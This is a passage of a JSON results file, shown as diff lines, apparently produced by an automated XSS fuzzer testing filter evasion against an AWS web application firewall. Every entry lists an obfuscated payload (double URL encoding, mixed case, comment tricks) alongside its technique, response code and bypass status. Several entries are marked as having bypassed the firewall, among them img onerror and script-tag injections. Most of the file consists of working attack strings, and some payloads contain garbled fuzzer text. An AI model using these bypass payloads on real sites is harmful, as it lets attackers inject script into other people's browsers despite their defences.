+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- <img\nsrc=x\nonerror=alert(1)> --><Img Src=x OnError=confirm(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"confirm(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CimG%2520sRc%253Dx%2520OnERrOr%253DaLERt%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<imG sRc=x OnERrOr=aLERt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"aLERt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg/%252a%252150000%252A/src%253Dx/%252A%252150000%252A/oNerRoR%253DaLerT%25281%2529%253E",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img/*!500OO*/src=x/*!500OO*/oNerRoR=aLerT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img *!500oo*=\"\" src=\"x/*!500OO*/oNerRoR=aLerT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSVG/ONlOad%253daleRt%25281%2529%253E <img src=x onerror = alert(1)>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVG/ONlOad=aleRt(1)> <img src=x onerror = alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"aleRt(1)\"> </svg>"
+                    },
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIMG%2509src%253Dx%2520oNeRrOr%253dAlErT%25281%2529%253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<IMG\tsrc=x oNeRrOr=AlErT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253ciMG%252520sRc%25253dX%252520OnErRoR%25253daLerT%2525281%252529%25253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<iMG sRc=X OnErRoR=aLerT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"aLerT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CSVg/OnLOaD%253DaleRt%25281%2529%253e",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVg/OnLOaD=aleRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"aleRt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "details",
+                        "html": "<details onblur=\"alert(1)\" tabindex=\"1\" id=\"x\"></details>"
+                    },
+                    {
+                        "tag_name": "input",
+                        "html": "<input autofocus=\"\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<img src%3dx onerror%253Dalert%281%29> --> ａｂＣ /*6*/",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img src=x onerror=alert(1)> --> abC /*6*/",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!--%20onmouseover%3dalert(1)%281%29%25a0--><img%20src=x%20onerror=confirm(1)>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- onmouseover=alert(1)(1)%aO--><img src=x onerror=confirm(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"confirm(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cmarquee%2520onstart%253Dalert%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<marquee onstart=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "marquee",
+                        "html": "<marquee onstart=\"alert(1)\"></marquee>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CIMG%2520sRc%253dX%2520OnErRoR%253DaLerT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMG sRc=X OnErRoR=aLerT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"aLerT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cIFRaME%26%2347%3bByErBoNeR%26%2347%3B1%25253d1%25253eKURZBESCHREIBUNG%20-%20In尺度IR%2WNWDD#FGGh -- 89</img>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRaME/ByErBoNeR/1=1>KURZBESCHREIBUNG - In尺度IR%2WNWDD#FGGh -- 89</img>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe byerboner=\"\" 1=\"1\">KURZBESCHREIBUNG - In尺度IR%2WNWDD#FGGh -- 89</img></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cScrIpt%25253EALERT%2525281%252529%25253C/sCRIpT%25253E</img>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ScrIpt>ALERT(1)</sCRIpT></img>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    }
+]
